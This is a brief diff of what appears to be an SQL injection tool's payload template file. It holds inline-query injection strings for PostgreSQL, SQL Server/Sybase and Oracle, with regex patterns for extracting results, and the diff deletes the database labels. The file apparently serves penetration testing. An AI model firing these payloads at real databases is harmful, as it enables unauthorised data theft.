@@ -6,21 +6,19 @@
 
 (SELECT CONCAT('Fd7zGLnCk2JKcH9gJ',(ELT(2=8,1)),'UNION'))
 Jp9P8dvjU4Te2WVLg(?P<result>.*?)UNION
-title PostgreSQL inline queries
 (SELECT 't9hRZpf7ay0XLKsAq'||(LWYbYlX)::text||'UNION')
 
 (SELECT 'haijtNmYE4wjnv5RN'||(SELECT (CASE WHEN (92=43) THEN 1 ELSE 0 END))::text||'UNION')
 L5esVmpr1QwIVw8DD(?P<result>.*?)UNION
-dbms PostgreSQL
-title Microsoft SQL Server/Sybase inline queries
+
 (SELECT '9o2YlCjkT6QVfMnG5'+(VuwBJxX)+'UNION')
 
 (SELECT 'SRbbK9RfBpCcAScs8'+(CASE WHEN (28=57) THEN '1' ELSE '0' END)+'UNION')
 IHKmpxkK7DLJ0n1vY(?P<result>.*?)UNION
-dbms
-Microsoft SQL Server
-Sybase
-title Oracle inline queries
+
+
+
+
 (SELECT ('dERspzuupqTK1pCNj'||(jnqNzVV)||'UNION') FROM DUAL)
 
 (SELECT 'Ma0HAwhdO1IVVR6TX'||(CASE WHEN (25=69) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'UNION' FROM DUAL)
